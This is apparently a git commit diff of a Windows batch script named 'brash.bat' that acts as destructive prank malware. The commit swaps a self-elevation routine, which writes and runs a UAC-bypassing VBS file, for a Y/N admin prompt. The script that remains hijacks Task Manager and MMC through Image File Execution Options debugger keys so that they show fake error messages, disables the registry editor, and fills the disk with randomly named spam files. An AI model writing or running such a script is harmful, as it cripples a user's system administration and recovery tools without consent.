ffa5506e0cc802fef0f228331ff959a9f6a4392a
Michael <70703680+michelle1574@users.noreply.github.com>
2021-10-27 21:20:48 +0200

    Fixed something that was wrong in the script.

--- trash-1/brash.bat
+++ trash-1/brash.bat
@@ -1,30 +1,13 @@
 @echo off
-    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
->nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-) ELSE (
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-)
-
-if '%errorlevel%' NEQ '0' (
-    goto UACPrompt
-) else ( goto gotAdmin )
-
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params= %*
-    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-
-:gotAdmin
+echo Did you run this as administrator?
+choice /c YN /m "[Y]es or [N]o?"
+if errorlevel equ 1 goto main
+if errorlevel equ 2 exit
 echo x=msgbox^("The MMC has been disabled by administrator.", VBOkOnly+VbCritical, "Error"^) > C:\Windows\error_mmc.vbs
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /d C:\Windows\error_mmc.vbs /t REG_SZ /f > nul
 echo x=msgbox^("The task manager been disabled by administrator.", VBOkOnly+VbCritical, "Error"^) > C:\Windows\error_taskmgr.vbs
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /d C:\Windows\error_taskmgr.vbs /t REG_SZ /f > nul
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /d 1 /t REG_DWORD /f > nul
-
 mkdir C:\%random%
 echo spamspamspamspamspamspamspam > %random%\%random%
 echo spamspamspamspamspamspamspam > %random%
